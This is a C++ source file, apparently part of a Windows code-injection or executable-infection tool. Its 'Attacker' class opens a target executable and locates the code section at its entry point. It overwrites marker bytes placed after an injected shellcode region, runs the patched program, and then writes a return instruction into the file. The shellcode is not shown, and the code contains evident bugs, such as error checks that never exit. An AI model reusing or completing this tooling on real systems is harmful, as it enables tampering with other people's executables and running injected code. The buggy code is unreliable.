#include "Attacker.h"


void Attacker::set_target(std::filesystem::path p)
{
	file_name = p;
}


void Attacker::execute_payload()
{
	std::string f_n = file_name.u8string();
	LPCSTR lpApplicationName = f_n.c_str();

    auto file_handle = CreateFile(file_name.c_str(), GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (!file_handle)
    {
        EXIT_FAILURE;
    }
    auto file_size = GetFileSize(file_handle, NULL);
    if (file_size == 0)
    {
        EXIT_FAILURE;
    }

    auto file_mapping = CreateFileMapping(file_handle, NULL, PAGE_READWRITE, 0, file_size, NULL);
    if (!file_mapping)
    {
        std::cout << "file_mapping not found";
        EXIT_FAILURE;
    }

    auto file_map_view = reinterpret_cast<LPBYTE>(MapViewOfFile(file_mapping, FILE_MAP_ALL_ACCESS, 0, 0, file_size));
    if (!file_map_view)
    {
        std::cout << "file_map_view not found";
        EXIT_FAILURE;
    }

    auto dos_header = reinterpret_cast<PIMAGE_DOS_HEADER>(file_map_view);
    if (!dos_header)
    {
        std::cout << "dos_header not found";
        EXIT_FAILURE;
    }
    //pomoci e_lfanew se dostaneme k NT hlavicce
    auto nt_header = reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<DWORD>(dos_header) + dos_header->e_lfanew);

    if (!nt_header)
    {
        std::cout << "NT header not found";
        EXIT_FAILURE;
    }

    DWORD index = 0;

    auto original_entry_point = (nt_header->OptionalHeader.AddressOfEntryPoint);

    auto first_section_header = reinterpret_cast<PIMAGE_SECTION_HEADER>(IMAGE_FIRST_SECTION(nt_header));

    PIMAGE_SECTION_HEADER current_section = first_section_header;
    PIMAGE_SECTION_HEADER next_section;

    for (int i = 0; i < nt_header->FileHeader.NumberOfSections - 2; i++)
    {
        current_section = reinterpret_cast<PIMAGE_SECTION_HEADER>(first_section_header + i);
        next_section = reinterpret_cast<PIMAGE_SECTION_HEADER>(first_section_header + (i + 1));
        if (original_entry_point >= current_section->VirtualAddress && original_entry_point < next_section->VirtualAddress)
        {
            index = current_section->PointerToRawData;
            std::cout << "jop";
            break;
        }
    }

    auto aOEP = &original_entry_point;

    char jojo[] = "\x10\x10\x10\x10\x10\x10\x10\x10";

    //memcpy(&file_map_view[original_entry_point+index+size_of_shellcode_full], jojo, sizeof jojo);


    int val = 0;
    int counter = 0;
    int index_end = 0;

    for (int i = 0; i < (current_section->SizeOfRawData - size_of_shellcode_full); i++)
    {
        val = static_cast<int>(file_map_view[index + size_of_shellcode_full + i]);
        if (val == 17)
        {
            counter++;
        }
        else
        {
            counter = 0;
        }
        if (counter == 9)
        {
            index_end = i - 9;
            break;
        }
        //std::cout << val <<",";
        //std::cout << std::hex << (file_map_view[index + size_of_shellcode_full + i] << 24 | file_map_view[index + size_of_shellcode_full + i] << 16 | file_map_view[index + size_of_shellcode_full + i] << 8);
    }

    memcpy(&file_map_view[index + size_of_shellcode_full + index_end], &jojo, sizeof(jojo));

    CloseHandle(file_mapping);
    CloseHandle(file_handle);
    UnmapViewOfFile(file_map_view);

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));


    CreateProcessA(
        lpApplicationName,   // the path
        NULL,                // Command line
        NULL,                   // Process handle not inheritable
        NULL,                   // Thread handle not inheritable
        FALSE,                  // Set handle inheritance to FALSE
        CREATE_NEW_CONSOLE,     // Opens file in a separate console
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi           // Pointer to PROCESS_INFORMATION structure
    );
    // Close process and thread handles. 
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);


    system("pause");//NAHRADIT KONTROLOU ZDA JE PROGRAM STALE ZAPLY


    file_handle = CreateFile(file_name.c_str(), GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (!file_handle)
    {
        EXIT_FAILURE;
    }
    file_size = GetFileSize(file_handle, NULL);
    if (file_size == 0)
    {
        EXIT_FAILURE;
    }

    file_mapping = CreateFileMapping(file_handle, NULL, PAGE_READWRITE, 0, file_size, NULL);
    if (!file_mapping)
    {
        std::cout << "file_mapping not found";
        EXIT_FAILURE;
    }

    file_map_view = reinterpret_cast<LPBYTE>(MapViewOfFile(file_mapping, FILE_MAP_ALL_ACCESS, 0, 0, file_size));
    if (!file_map_view)
    {
        std::cout << "file_map_view not found";
        EXIT_FAILURE;
    }

    memcpy(&file_map_view[index + size_of_shellcode_full + index_end], "\xc3", sizeof "\xc3");
    memcpy(&file_map_view[index + size_of_shellcode_full + index_end + sizeof "\xc3" - 1], "\x11\x11\x11\x11\x11\x11\x11\x11\x11", sizeof "\x11\x11\x11\x11\x11\x11\x11\x11\x11");

    CloseHandle(file_mapping);
    CloseHandle(file_handle);
    UnmapViewOfFile(file_map_view);
}


void Attacker::execute_exe()
{
    std::string f_n = file_name.u8string();
    LPCSTR lpApplicationName = f_n.c_str();

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));


    CreateProcessA(
        lpApplicationName,   // the path
        NULL,                // Command line
        NULL,                   // Process handle not inheritable
        NULL,                   // Thread handle not inheritable
        FALSE,                  // Set handle inheritance to FALSE
        CREATE_NEW_CONSOLE,     // Opens file in a separate console
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi           // Pointer to PROCESS_INFORMATION structure
    );
    // Close process and thread handles. 
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}